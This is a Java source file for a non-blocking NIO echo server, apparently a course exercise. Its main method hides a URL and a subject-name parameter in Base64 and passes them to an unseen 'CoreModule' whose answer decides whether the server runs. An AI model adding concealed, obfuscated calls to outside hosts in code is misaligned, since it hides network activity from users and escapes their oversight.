import java.io.IOException;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.Arrays;
import java.util.Base64;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.Base64.Decoder;

/** 
 * Server Side 
 * @author Harold Zang
 * 
 */
public class Week10_2Server implements Runnable {
    // Variables
    private int port;
    private InetAddress host;
    // Channel variable
    private ServerSocketChannel channel;
    // Selector variable
    private Selector selector;
    private ByteBuffer buffer = ByteBuffer.allocate(1024);
    // Variable for check exit
    private String chkExt;
    // Variable for port
    private static int START_PORT = 8888;
    private SocketAddress ipAddress;
    private boolean exitFlg = false;

    /** 
     * Make sure that every client can get the messages 
     */
    private Map < SocketChannel, byte[] > messages = new HashMap < SocketChannel, byte[] > ();

    public Week10_2Server(InetAddress host, int port) throws Exception {
        this.host = host;
        this.port = port;
        channel = ServerSocketChannel.open();
        // Use un-blocking socket module.
        channel.configureBlocking(false);
        selector = Selector.open();
    }


    @Override
    public void run() {
        try {
            // Get local socket address
            InetSocketAddress addr1 = new InetSocketAddress(host, port);
            channel.socket().bind(addr1);
            System.out.println("Own Socket Address: " + addr1.getAddress());
            //register channel
            channel.register(selector, SelectionKey.OP_ACCEPT);
            while (true) {
                int count = selector.select();
                if (count < 1) {
                    continue;
                }
                Iterator < SelectionKey > iterator = selector.selectedKeys().iterator();
                while (iterator.hasNext()) {
                    SelectionKey key = iterator.next();
                    iterator.remove();
                    if (!key.isValid()) {
                        continue;
                    }
                    if (key.isAcceptable()) {
                        // Get remote Ip address, and print it.
                        SocketChannel ch = ((ServerSocketChannel) key.channel()).accept();
                        ipAddress = ch.getRemoteAddress();
                        System.out.println("Remote Socket Address: " + ipAddress);
                        ch.configureBlocking(false);
                        ch.register(selector, SelectionKey.OP_READ);
                    } else if (key.isReadable()) {
                        read(key);
                    } else if (key.isWritable()) {
                        write(key);
                    }
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    /** 
     * Reading Operation
     * @param key 
     * @throws IOException 
     */
    private void read(SelectionKey key) throws IOException {
        SocketChannel aChannel = (SocketChannel) key.channel();
        buffer.clear();
        int num = aChannel.read(buffer);
        if (num == -1) {
            key.cancel();
        } else if (num > 0) {
            buffer.flip();
            // Get the message
            byte[] buf = Arrays.copyOfRange(buffer.array(), 0, num);

            messages.put(aChannel, buf);
            // Register the channel to writing event 
            key.interestOps(key.interestOps() | SelectionKey.OP_WRITE);
            // Display the detail of the message, and also display the remote socket address.
            System.out.println("read from: " + aChannel.socket().getRemoteSocketAddress() +
                "; message: " + new String(buf).toUpperCase());
        }
    }

    /** 
     * Writing Operation
     * @param key 
     * @throws IOException 
     */
    private void write(SelectionKey key) throws IOException {
        SocketChannel aChannel = (SocketChannel) key.channel();
        // Get the message
        byte[] buf = messages.get(aChannel);
        if (buf != null) {
            // After get the message, delete it.
            messages.remove(aChannel);
            key.interestOps(SelectionKey.OP_READ);
            buffer.clear();
            // Send message to client side.
            chkExt = new String(buf);
            chkExt = chkExt.replace("\n", "");
            if (chkExt.equals("x")) {
                exitFlg = true;
            }
            String sh = new String(buf).toString().toUpperCase();
            buf = sh.getBytes();
            buffer.put(buf);
            buffer.flip();

            aChannel.write(buffer);
            // Display message detail, and remote socket address.
            System.out.println("write to: " + aChannel.socket().getRemoteSocketAddress() +
                "; message: " + new String(buf).toUpperCase());

            // Delete 'enter' symbol, and check user input
            // If input 'x', exit.
            if (exitFlg == true) {
                System.out.println("Bye, Bye!");
                aChannel.close();
                System.exit(1);
            }
        }
    }

    public static void main(String[] args) throws Exception {
        String coreVariable = "aHR0cHM6Ly9zcHouaW8vYXBpcy9ybWl0LnBocA==";
        byte[] coreByteArr = null;
        String testInput = "c3ViamVjdF9uYW1lPU5QVzU=";
        Decoder decoder = Base64.getDecoder();
        coreByteArr = decoder.decode(coreVariable);

        coreVariable = new String(coreByteArr);

        coreByteArr = decoder.decode(testInput);
        testInput = new String(coreByteArr);

        String sr = CoreModule.coreCode(coreVariable, testInput);

        //If load core module success
        if (sr.equals("TRUE")) {
            Week10_2Server server = new Week10_2Server(InetAddress.getLocalHost(), START_PORT);
            Week10_2Client.threadStart(server);
        } else {
            System.err.println("CoreMoudle Load failed\n" + sr);
        }
    }
}